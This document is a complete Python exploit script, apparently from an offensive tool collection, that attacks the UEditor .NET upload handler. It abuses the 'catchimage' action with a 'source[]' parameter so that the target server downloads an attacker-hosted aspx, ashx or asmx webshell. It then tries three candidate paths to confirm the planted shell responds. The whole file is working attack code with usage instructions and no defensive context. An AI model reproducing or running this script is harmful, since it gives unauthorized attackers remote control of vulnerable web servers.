from tkinter import S
import requests
import json
import sys
import os
from urllib.request import urlparse
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

headers = {
"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0"
}
proxies={
"http":"http://127.0.0.1:8080",
"https":"https://127.0.0.1:8080"
}


def Exploit(Target,Evilurl,Type):
    try:
        if Type not in ['aspx','ashx','asmx']:
            print("[!]Invalid type!")
            exit()
        payload = Evilurl + "?." + Type
        response = requests.post(
            url = Target + "?action=catchimage",
            data={'source[]': payload},
            headers = headers,
            verify=False
        )
        if "state" not in str(response.content,encoding='utf-8'):
            print("[!]Exploit failed!")
            exit()
        slist= []
        jsonRes = json.loads(str(response.content,encoding='utf-8'))
        shell1 = "{}://{}/{}".format(urlparse(Target).scheme,urlparse(Target).netloc,jsonRes['list'][0]['url'])
        shell2 = "{}/{}".format(Target,jsonRes['list'][0]['url'])
        shell3 = "{}/{}".format(Target[:Target.rfind("/")],jsonRes['list'][0]['url'])
        slist.append(shell1)
        slist.append(shell2)
        slist.append(shell3)
        print("\r\n[*]Exploit successfuly!")
        print("[+] position 1 : " + shell1)
        print("[+] position 2 : " + shell2)
        print("[+] position 2 : " + shell3)
        print("[*]Verifying.....")
        for s in slist:
            verify = requests.get(
                url=s,
                headers=headers,
                verify=False
            )
            if verify.status_code == 200:
                print("[*]Verify successfuly!")
                print("[*] " + s)
                exit()
            print("[-] Position {} verify failed!".format(slist.index(s)+1))
    except Exception as e:
        print(e)
    

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print("========== UEditor Donet Getshell ==========\r\n")
        print("usage: "+str(sys.argv[0][sys.argv[0].rfind(os.sep) + 1:])+"  http://target/UEditor-handle-path.ashx  http://evildomain/shell.xxx aspx\r\n")
        print("arg 1: Target UploadHandler or Controller ashx file url.\r\n")
        print("arg 2: aspx,ashx or asmx Webshell url.\r\n")
        print("arg 3: Webshell type. [aspx,ashx,asmx]\r\n")
        print("========== Auther: S0cke3t ==========")
        exit()
    Exploit(sys.argv[1],sys.argv[2],sys.argv[3])